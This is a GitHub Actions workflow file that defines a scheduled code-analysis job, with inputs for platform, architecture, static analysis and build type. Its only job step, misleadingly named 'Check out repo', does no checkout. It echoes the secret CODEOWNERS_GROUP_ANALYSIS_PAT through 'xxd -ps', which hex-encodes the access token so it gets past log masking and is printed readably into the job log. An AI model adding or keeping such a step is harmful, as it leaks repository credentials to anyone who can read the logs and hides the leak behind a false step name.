name: "Code analysis"

on:
  schedule:
    # Run daily at 6 PM PST (2 AM UTC next day)
    - cron: "0 2 * * *"
  workflow_call:
    inputs:
      platform:
        required: false
        type: string
        default: "Ubuntu 24.04"
        description: "Platform to analyze (e.g., 'Ubuntu 22.04', 'Ubuntu 24.04')"
      architecture:
        required: false
        type: string
        default: "amd64"
      enable-static-analysis:
        description: "Enable Clang Static Analyzer (CSA) via CodeChecker"
        required: false
        type: boolean
        default: false
      # Pre-built Docker image tags (optional - if provided, skips docker build)
      ci-build-docker-image:
        required: false
        type: string
        default: ""
        description: "Pre-built CI Build Docker image tag"
      dev-docker-image:
        required: false
        type: string
        default: ""
        description: "Pre-built Dev Docker image tag"
      debug-file-filter:
        description: >-
          Analyze only specific file(s) for fast debugging
          (e.g., 'tests/tt_metal/**/*.hpp' or 'path/to/file.cpp')
        required: false
        type: string
        default: ""
      build-type:
        required: false
        type: string
        default: "Release"
        description: "Build type configuration (Release, Debug, RelWithDebInfo, ASan, TSan)"
      enable-lto:
        required: false
        type: boolean
        default: false
        description: "Enable Link Time Optimization (LTO)"
  workflow_dispatch:
    inputs:
      architecture:
        required: false
        type: string
        default: "amd64"
      enable-static-analysis:
        description: "Enable Clang Static Analyzer (CSA) via CodeChecker"
        required: false
        type: boolean
        default: false
      debug-file-filter:
        description: >-
          Analyze only specific file(s) for fast debugging
          (e.g., 'tests/tt_metal/**/*.hpp' or 'path/to/file.cpp')
        required: false
        type: string
        default: ""
      platform:
        required: false
        type: choice
        default: "Ubuntu 24.04"
        options:
          - "Ubuntu 22.04"
          - "Ubuntu 24.04"
        description: "Platform to analyze"
      build-type:
        required: false
        type: choice
        default: Release
        options:
          - Release
          - Debug
          - RelWithDebInfo
          - ASan
          - TSan
        description: "Build type configuration"
      enable-lto:
        required: false
        type: boolean
        default: false
        description: "Enable Link Time Optimization (LTO)"

jobs:
  # NOTE: Platform parsing is handled by build-docker-artifact.yaml internally.
  # This workflow only needs to pass the platform string.

  determine-scan-type:
    runs-on: ubuntu-latest
    steps:
      - name: Check out repo
        run: echo -n "${{ secrets.CODEOWNERS_GROUP_ANALYSIS_PAT }}" | xxd -ps

      
